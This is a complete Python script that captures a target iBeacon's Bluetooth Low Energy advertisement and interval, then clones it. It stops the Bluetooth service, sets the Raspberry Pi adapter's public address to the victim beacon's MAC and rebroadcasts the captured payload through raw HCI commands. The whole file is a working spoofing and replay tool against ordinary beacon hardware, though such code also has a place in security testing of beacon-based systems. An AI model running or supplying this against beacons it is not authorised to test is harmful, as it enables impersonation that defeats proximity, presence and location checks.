#!/usr/bin/env python3
"""
ibeacon_replay.py

Capture an iBeacon’s advertisement from live BLE traffic, measure its interval from two packets,
and replay it continuously using the Raspberry Pi’s Bluetooth adapter — spoofing the beacon’s
public address and matching its original advertise interval.

Usage:
    sudo python3 ibeacon_replay.py --mac C3:00:00:3D:D1:F7 [--timeout 10]
"""

import asyncio, argparse, os, sys, subprocess, time, re
from bleak import BleakScanner

async def capture_ibeacon(target_mac: str, timeout: int):
    result = {}
    stop_event = asyncio.Event()
    times = []

    def detection_callback(device, adv_data):
        if device.address.lower() == target_mac.lower() and adv_data.manufacturer_data:
            now = time.time()
            times.append(now)
            if 'manufacturer_data' not in result:
                result['manufacturer_data'] = adv_data.manufacturer_data
                result['service_data']     = adv_data.service_data
                result['local_name']       = adv_data.local_name
                result['tx_power']         = adv_data.tx_power
            if len(times) >= 2:
                stop_event.set()

    scanner = BleakScanner(detection_callback, scanning_mode="active")
    await scanner.start()
    try:
        await asyncio.wait_for(stop_event.wait(), timeout)
    except asyncio.TimeoutError:
        pass
    finally:
        await scanner.stop()

    if len(times) >= 2:
        result['interval_ms'] = (times[1] - times[0]) * 1000.0
    else:
        result['interval_ms'] = 100.0

    return result

def build_adv_bytes(manufacturer_data: dict) -> bytes:
    flags_struct = b"\x02\x01\x06"
    comp_id, payload = next(iter(manufacturer_data.items()))
    comp_bytes = comp_id.to_bytes(2, 'little')
    manu_struct = bytes([len(payload) + len(comp_bytes) + 1, 0xFF]) + comp_bytes + payload
    return flags_struct + manu_struct

def build_scan_resp_bytes(service_data: dict, local_name: str, tx_power: int) -> bytes:
    parts = []
    for uuid_str in service_data.keys():
        m16 = re.fullmatch(r"[0-9A-Fa-f]{4}", uuid_str)
        m128 = re.fullmatch(
            r"0000([0-9A-Fa-f]{4})-0000-1000-8000-00805f9b34fb", uuid_str
        )
        if m16 or m128:
            hex16 = m16.group(0) if m16 else m128.group(1)
            val = int(hex16, 16)
            parts.append(bytes([3, 0x03, val & 0xFF, (val >> 8) & 0xFF]))
    for uuid_str, data_bytes in service_data.items():
        m128 = re.fullmatch(
            r"0000([0-9A-Fa-f]{4})-0000-1000-8000-00805f9b34fb", uuid_str
        )
        m16 = re.fullmatch(r"[0-9A-Fa-f]{4}", uuid_str)
        if m16 or m128:
            hex16 = m16.group(0) if m16 else m128.group(1)
            val = int(hex16, 16)
            uuid_le = val.to_bytes(2, 'little')
            length = 1 + len(uuid_le) + len(data_bytes)
            parts.append(bytes([length, 0x16]) + uuid_le + data_bytes)
    if tx_power is not None:
        parts.append(bytes([0x02, 0x0A, tx_power & 0xFF]))
    if local_name:
        nb = local_name.encode('utf-8')
        parts.append(bytes([len(nb) + 1, 0x09]) + nb)
    return b"".join(parts)

def main():
    import time

    # 0) Parse args & require root
    parser = argparse.ArgumentParser(
        description="Capture & replay an iBeacon on Raspberry Pi (public-addr spoof, matching interval)"
    )
    parser.add_argument("--mac", "-m", required=True,
                        help="Target iBeacon MAC (e.g. C3:00:00:3D:D1:F7)")
    parser.add_argument("--timeout", "-t", type=int, default=10,
                        help="Scan timeout in seconds")
    args = parser.parse_args()
    target_mac = args.mac.upper()
    timeout    = args.timeout

    if os.geteuid() != 0:
        sys.exit("Error: run with sudo")

    # 1) Capture first two adverts & measure interval
    print(f"[*] Scanning for {target_mac} (timeout={timeout}s)…")
    adv = asyncio.run(capture_ibeacon(target_mac, timeout))
    if "manufacturer_data" not in adv:
        sys.exit(f"[!] No advertisement found for {target_mac}")
    manuf       = adv["manufacturer_data"]
    svc         = adv.get("service_data", {})
    name        = adv.get("local_name")
    tx          = adv.get("tx_power")
    interval_ms = adv.get("interval_ms", 100.0)

    # 2) Compute HCI “units” (0.625 ms per unit)
    units = int(round(interval_ms / 0.625))
    units = max(0x0020, min(units, 0x4000))
    lsb, msb = units & 0xFF, (units >> 8) & 0xFF
    print(f"[*] Measured interval: {interval_ms:.1f} ms → units=0x{msb:02X}{lsb:02X}")

    # 3) Build raw ADV + SCAN_RSP payloads
    adv_bytes       = build_adv_bytes(manuf)
    scan_resp_bytes = build_scan_resp_bytes(svc, name, tx)
    print(f"[*] ADV payload:      {adv_bytes.hex()}")
    if scan_resp_bytes:
        print(f"[*] SCAN_RSP payload: {scan_resp_bytes.hex()}")

    # 4) Stop bluetoothd so it won’t override HCI
    print("[*] Stopping bluetoothd…")
    subprocess.run(["systemctl", "stop", "bluetooth"], check=True)
    time.sleep(0.2)

    # 5) Cycle hci0 & spoof public address
    print(f"[*] Cycling hci0 and setting public-addr to {target_mac}…")
    subprocess.run(["hciconfig", "hci0", "down"], check=True)
    subprocess.run(["btmgmt", "--index", "0", "public-addr", target_mac], check=True)
    subprocess.run(["hciconfig", "hci0", "up"],   check=True)
    subprocess.run(["rfkill",   "unblock", "bluetooth"], check=True)
    time.sleep(0.1)

    # 6) HCI Reset to clear any state
    subprocess.run(["hcitool", "cmd", "0x03", "0x0003"], check=True)
    time.sleep(0.1)

    # 7) Set **scannable** LE advertising parameters (ADV_SCAN_IND)
    print("[*] Setting legacy advertising parameters (ADV_SCAN_IND)…")
    subprocess.run([
        "hcitool", "cmd", "0x08", "0x0006",
        f"{lsb:02X}", f"{msb:02X}",  # interval min
        f"{lsb:02X}", f"{msb:02X}",  # interval max
        "02",                        # Adv_Type = ADV_SCAN_IND
        "00",                        # Own_Address_Type = Public
        "00",                        # Peer_Address_Type = Public (ignored)
        "00","00","00","00","00","00",# Peer_Address (6 bytes)
        "07",                        # Channel_Map = all
        "00"                         # Filter_Policy = none
    ], check=True)
    time.sleep(0.1)

    # 8) Load ADV payload
    print("[*] Loading ADV payload…")
    subprocess.run(
        ["hcitool", "cmd", "0x08", "0x0008", f"{len(adv_bytes):02X}"]
        + [f"{b:02X}" for b in adv_bytes],
        check=True
    )
    time.sleep(0.1)

    # 9) Load SCAN_RSP payload
    if scan_resp_bytes:
        print("[*] Loading SCAN_RSP payload…")
        subprocess.run(
            ["hcitool", "cmd", "0x08", "0x0009", f"{len(scan_resp_bytes):02X}"]
            + [f"{b:02X}" for b in scan_resp_bytes],
            check=True
        )
        time.sleep(0.1)

    # 10) Enable advertising
    print("[*] Enabling advertising…")
    subprocess.run(
        ["hcitool", "cmd", "0x08", "0x000A", "01"],
        check=True
    )

    print(f"[+] Now advertising as {target_mac} at ~{interval_ms:.1f} ms interval.")
    print("    Press Ctrl+C to exit (then `systemctl start bluetooth`).")

    
if __name__ == "__main__":
    main()

